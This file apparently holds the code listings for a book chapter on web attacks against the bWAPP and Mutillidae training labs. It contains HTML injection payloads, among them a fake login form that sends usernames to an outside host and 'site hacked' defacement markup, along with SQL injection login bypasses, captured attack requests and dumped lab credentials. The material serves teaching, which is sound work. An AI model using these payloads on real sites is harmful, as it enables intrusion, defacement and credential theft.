@@ -1,0 +1,208 @@
+//code 10.1
+<h1>You can add any HTML code here...</h1>
+
+-----------------
+
+//code 10.2
+POST /bWAPP/htmli_post.php HTTP/1.1
+Host: 192.168.2.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.2/bWAPP/htmli_post.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Cookie: PHPSESSID=n34706npi41did8c59klvta455; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; security_level=0
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+firstname=sanjib&lastname=sinha&form=submit
+
+------------------------
+
+//code 10.3
+<form name="login" action="http://10.0.2.15:1234/test.html"
+<table>
+<tr><td>Username:</td><td><input type="text" name="username"</td></tr>
+</table>
+<input type="submit" value="Submit" />
+</form>
+
+---------------------
+
+//code 10.4
+GET /test.html?username=anything HTTP/1.1
+Host: 10.0.2.15:1234
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.2/bWAPP/htmli_stored.php
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+--------------------------
+
+//code 10.5
+<tr height="40">
+ <td align="center">6</td>
+ <td>sanjib</td>
+ <td>2019-08-12 23:45:42</td>
+ <td><form name="login" action="http://10.0.2.15:1234/test.html"
+<table>
+<tr><td>Username:</td><td><input type="text" name="username"</td></tr>
+</table>
+<input type="submit" value="Submit" />
+</form></td>
+ </tr>
+
+
+-----------------
+
+//code 10.6
+<tr height="40">
+ <td align="center">6</td>
+ <td>sanjib</td>
+ <td>2019-08-12 23:45:42</td>
+<td>&lt;form name=&quot;login&quot; action=&quot;http://10.0.2.15:1234/test.html&quot;
+&lt;table&gt;
+&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;</td>
+
+-------------------------
+
+//code 10.7
+FF0000"><h1>This site has been HACKED"</h1>
+
+--------------------------
+
+//code 10.8
+I am going to inject HTML code</td><h1><marquee>This site has been hacked!</marquee></h1>
+
+--------------------------
+
+//code 10.9
+Username=sanjib
+Password=123456
+Signature=I am Sanjib
+
+
+----------------------------
+
+//code 10.10
+SELECT * FROM accounts WHERE username="sanjib" AND password="123456";
+
+------------------------
+
+//code 10.11
+sanjib' -- 
+
+-------------
+
+//code 10.12
+SELECT * FROM accounts WHERE username="sanjib" -- ;
+
+----------------
+
+//code 10.13
+SELECT * FROM accounts WHERE username="sanjib" OR 6=6 -- ;
+
+-------------------
+
+//code 10.14
+Username=admin
+Password=admin
+Signature=g0t r00t?
+
+Username=adrian
+Password=somepassword
+Signature=Zombie Films Rock!
+
+Username=john
+Password=monkey
+Signature=I like the smell of confunk
+
+Username=jeremy
+Password=password
+Signature=d1373 1337 speak
+
+Username=bryce
+Password=password
+Signature=I Love SANS
+
+Username=samurai
+Password=samurai
+Signature=Carving fools
+---
+
+---------------
+
+//code 10.15
+SELECT * FROM accounts WHERE username="sanjib" AND password="123456";
+
+------------------
+
+//code 10.16
+SELECT * FROM accounts WHERE username="sanjib" OR 1 -- 
+
+--------------------
+
+//code 10.17
+sanjib' OR 1 -- 
+
+-----------------------
+
+//code 10.18
+admin' -- 
+
+-------------------------
+
+//code 10.19
+SELECT * FROM accounts WHERE username="admin" -- ;
+
+------------------------
+
+//code 10.20
+POST /mutillidae/index.php?page=login.php HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/mutillidae/index.php?page=login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Cookie: showhints=1; PHPSESSID=4v0q10evpq6jjrlgjt68djtl80; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+username=sadldfjfkg&password=&login-php-submit-button=Login
+
+------------------------
+
+//code 10.21
+POST /mutillidae/index.php?page=login.php HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/mutillidae/index.php?page=login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Cookie: showhints=1; PHPSESSID=4v0q10evpq6jjrlgjt68djtl80; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+username=s§adldfjfkg§&password=&login-php-submit-button=Login
+
+---------------------------
+
+
